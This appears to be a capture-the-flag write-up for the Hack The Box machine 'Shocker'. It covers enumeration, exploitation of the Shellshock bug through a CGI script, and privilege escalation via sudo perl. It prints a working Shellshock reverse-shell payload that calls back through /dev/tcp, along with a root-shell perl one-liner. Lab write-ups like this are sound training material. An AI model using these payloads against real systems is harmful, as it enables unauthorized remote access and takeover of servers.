# Shocker

# Enumeration

## Nmap

I start off with a simple nmap of the system. Looks like the system is running an Apache server over port 80 and OpenSSH over port 2222.

```bash
nmap -sC -sV shocker.htb > nmap.txt
```

![Untitled](writeups/hackthebox/shocker/POC/nmap)

## Website

### Page

Visiting the webpage I see a simple image of a bug saying “Don’t Bug Me!”

![Untitled](writeups/hackthebox/shocker/POC/website)

Checking the source doesnt reveal any further information as well.

```html
<!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html>
```

### Dirb

Since I can’t find any giveaways on the page itself, I’ll run dirb to brute force some possible directories. I find a directory by the name of `cgi-bin/` which seems interesting to me, I should google this directory name and see if I can find any vulnerabilities.

![Untitled](writeups/hackthebox/shocker/POC/dirb.png)

After doing some research, it seems that cgi-bin is a directory containing CGI scripts which can be used to call out to applications hosted on the server. 

After a bit more digging, it seems that CGI scripts are typically shell, cgi, or perl scripts. I will run dirb again against the cgi-bin directory, this time searching for shell scripts. This reveals `/cgi-bin/user.sh`

![Untitled](writeups/hackthebox/shocker/POC/dirb2.png)

Traveling to the address prompts me to download the script, which I do. I’ll cat the file out to see what its contents are. The contents look like the results of the `uptime` command. So this is probably a script ruinning on the box.

![Untitled](writeups/hackthebox/shocker/POC/shell_script.png)

## Shellshock

One of the [results](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock) I ran into while searching for `cgi-bin/` vulnerabilities was for the ShellShock vulnerability. From what I can find it was a Bash vulnerability found in 2014 allowing for command execution due to how environment variables were handles.

The POC shown in this article shows how Bash will take `x='() { :;};’` as a function, and then execute the commands that come after it. For example with the following input:

```bash
$ env x='() { :;}; echo vulnerable' bash -c "echo test"
```

The output would be:

```bash
vulnerable
test
```

If an Apache server has CGI enabled, this can be exploited. To test this, I send a request testing if the system is vulnerable to shellshock:

```bash
curl -H "User-agent: () { :;}; echo; echo vulnerable" http://shocker.htb:80/cgi-bin/user.sh
```

![Untitled](writeups/hackthebox/shocker/POC/vulnerable.png)

Looks like this system is vulnerable!

# Exploitation

## Shellshock Reverse Shell

I set up a netcat listener on port 1234 and send the following payload to receive a connection back.

```bash
curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.2/1234 0>&1" http://shocker.htb:80/cgi-bin/user.sh
```

![Untitled](writeups/hackthebox/shocker/POC/reverse_shell.png)

We’re in!

## User Flag

Running `whoami` we can see we are the user shelly, first I’ll navigate to the users home directory and grab the user flag.

![Untitled](writeups/hackthebox/shocker/POC/user_flag.png)

# Privelege Escalation

## Sudo Commands

The first thing I always do to check for possible privelege escalation vectors is running the `sudo -l` command because of how quick it is. In this case it looks like shelly is able to run perl as root, this will be easy!

![Untitled](writeups/hackthebox/shocker/POC/shelly_sudo.png)

## Perl

Perl is a simple binary to use for priv esc, but I’ll usually check [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) to see how a binary can be exploited, as there is typically more than one way.

Because Perl is not complicated, I can just use the `-e` flag to run it directly from command line. I’ll then use the `exec` command to launching a new shell as root.

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

With my new shell launched, I run `whoami` once more to reveal that I am now root.

![Untitled](writeups/hackthebox/shocker/POC/root.png)

## Root Flag

Now all that needs to be done is navigate to the root directory and grab the root flag!

![Untitled](writeups/hackthebox/shocker/POC/root_flag.png)
